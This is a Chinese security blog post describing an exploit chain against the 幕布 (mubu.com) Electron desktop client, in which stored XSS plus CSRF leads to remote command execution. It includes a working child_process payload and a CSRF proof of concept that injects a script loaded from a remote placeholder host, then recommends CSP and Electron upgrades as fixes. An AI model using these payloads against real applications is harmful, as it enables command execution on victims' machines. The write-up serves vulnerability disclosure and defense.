<!DOCTYPE html>
<html lang="zh-CN"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description" content="uodate
一位安全研究员对幕布客户端的最新研究
https://xz.aliyun.com/t/4910
幕布(mubu.com)是一款头脑管理工具，用更高效的方式和清晰的结构来记录笔记、管理任务、制定工作计划、头脑风暴。用最好的方式释放您的大脑！
幕布使用 Electron 框架开发，想要验证这一点很容易，在 /Applications/幕布.app/Contents/ 可以可以发现一些 Electron 框架的信息
Electron 基于 Chromium 和 Node.js, 使用 HTML, CSS 和 JavaScript 来快速开发桌面程序。近几年发展迅猛，很多我们熟知的app其实都是Electron开发的，比如 vscode、atom、GitHub Desktop 等
在Black Hat Briefings 2017上国外安全研究员Luca Carettoni发表了一篇议题 ELECTRONEGATIVITY - A STUDY OF ELECTRON SECURITY
简单来说就是可以利用JavaScript执行系统命令，进而XSS跨站脚本攻击变成RCE远程命令执行
所以先要找到一个XSS漏洞，macOS上幕布1.1.0 版本有很多地方存在XSS，比如在搜索框输入JavaScript代码可正常执行 试试弹计算器的Payload
&lt;script type=&#34;text/javascript&#34;&gt; window.top.require(&#39;child_process&#39;).execFile(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;,function(){});&lt;/script&gt; 但是搜索框这个位置也只能影响到自己而已，还需要找到能够攻击别人XSS漏洞才够完美。 找呀找，发现文件夹名也能XSS，但也没办法攻击到别人，除非找到CSRF 创建文件夹或者越权更改文件夹名字的漏洞才行。 在Web版发现创建文件夹的CSRF漏洞
&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&#34;https://mubu.com/api/list/create_folder&#34; method=&#34;POST&#34;&gt; &lt;input type=&#34;hidden&#34; name=&#34;folderId&#34; value=&#34;0&#34; /&gt; &lt;input type=&#34;hidden&#34; name=&#34;name&#34; value=&#34;&lt;img/src=x onerror=s=document.">  

  <title>
    
      幕布(mubu.com) Client 远程命令执行
    
  </title>


  <link rel="shortcut icon" type="image/x-icon" href="/" />
  
  
  
  <link rel="stylesheet" href="/css/main.ff8eca9b0b00b45c48fc313f83495c86625933a46ab3079657980ca3c3a790edad11e6944fd08e43ee7b8f0f64d2d1d790a902ce62faa195d7133bc6598665b0.css" integrity="sha512-/47KmwsAtFxI/DE/g0lchmJZM6RqsweWV5gMo8OnkO2tEeaUT9COQ&#43;57jw9k0tHXkKkCzmL6oZXXEzvGWYZlsA==" />
  
</head>
<body a="auto">
        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">..</a>


<article>
    <p class="post-meta">
        <time datetime="2017-12-16 00:00:00 &#43;0000 UTC">
            2017-12-16
        </time>
    </p>

    <h1>幕布(mubu.com) Client 远程命令执行</h1>

    

    <p>uodate</p>
<p>一位安全研究员对幕布客户端的最新研究</p>
<p><a href="https://xz.aliyun.com/t/4910">https://xz.aliyun.com/t/4910</a></p>
<hr>
<blockquote>
<p>幕布(mubu.com)是一款头脑管理工具，用更高效的方式和清晰的结构来记录笔记、管理任务、制定工作计划、头脑风暴。用最好的方式释放您的大脑！</p>
</blockquote>
<p>幕布使用 Electron 框架开发，想要验证这一点很容易，在 /Applications/幕布.app/Contents/ 可以可以发现一些 Electron 框架的信息</p>
<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171649832.jpg" alt=""></p>
<p>Electron 基于 Chromium 和 Node.js, 使用 HTML, CSS 和 JavaScript 来快速开发桌面程序。近几年发展迅猛，很多我们熟知的app其实都是Electron开发的，比如 vscode、atom、GitHub Desktop 等</p>
<p>在Black Hat Briefings 2017上国外安全研究员<a href="https://www.blackhat.com/us-17/speakers/Luca-Carettoni.html">Luca Carettoni</a>发表了一篇议题 <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security.pdf">ELECTRONEGATIVITY - A STUDY OF ELECTRON SECURITY</a></p>
<p>简单来说就是可以利用JavaScript执行系统命令，进而XSS跨站脚本攻击变成RCE远程命令执行</p>
<p>所以先要找到一个XSS漏洞，macOS上幕布1.1.0 版本有很多地方存在XSS，比如在搜索框输入JavaScript代码可正常执行
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171649642.jpg" alt="">
试试弹计算器的Payload</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span><span style="color:#f92672">&gt;</span>   window.<span style="color:#a6e22e">top</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execFile</span>(<span style="color:#e6db74">&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;</span>,<span style="color:#66d9ef">function</span>(){});<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171649450.jpg" alt="">
但是搜索框这个位置也只能影响到自己而已，还需要找到能够攻击别人XSS漏洞才够完美。
找呀找，发现文件夹名也能XSS，但也没办法攻击到别人，除非找到CSRF 创建文件夹或者越权更改文件夹名字的漏洞才行。
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171650931.jpg" alt="">
在Web版发现创建文件夹的CSRF漏洞</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://mubu.com/api/list/create_folder&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;folderId&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;img/src=x onerror=s=document.createElement(&#39;script&#39;);s.src=&#39;http://xxx&#39;;document.head.appendChild(s);&gt;&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit request&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>有对一些敏感的标签做检查，黑名单策略很容易绕过，注入外部js时又遇到问题，因为页面是https并且 Referrer Policy:no-referrer-when-downgrade 所以不能降级加载http的资源，也没有https的域名只能作罢
前面说到可以XSS的地方有很多，比如文档标题在查看思维导图功能可以执行
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171650336.jpg" alt="">
当然在Client也是可以执行的，还没有no-referrer-when-downgrade的限制，可以通过文档分享功能进行传播
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171650468.jpg" alt="">
在用户昵称处存在XSS问题，保存功能存在CSRF，综合利用可以悄无声息保存文档，一旦用户在客户端打开即可触发执行命令
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171650853.gif" alt=""></p>
<p>修复：</p>
<p>其核心问题还是XSS问题，通常会建议使用CSP进行限制脚本执行，比如大名鼎鼎的VScode就是使用CSP，script-src 设置为self，仅允许同源的js加载，另外也要使用高版本Electron框架，因为Electron也是在不断完善迭代，新版会修复一些安全问题。</p>
<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171651254.jpg" alt=""></p>

</article>

            </div>
        </main>
    </body></html>
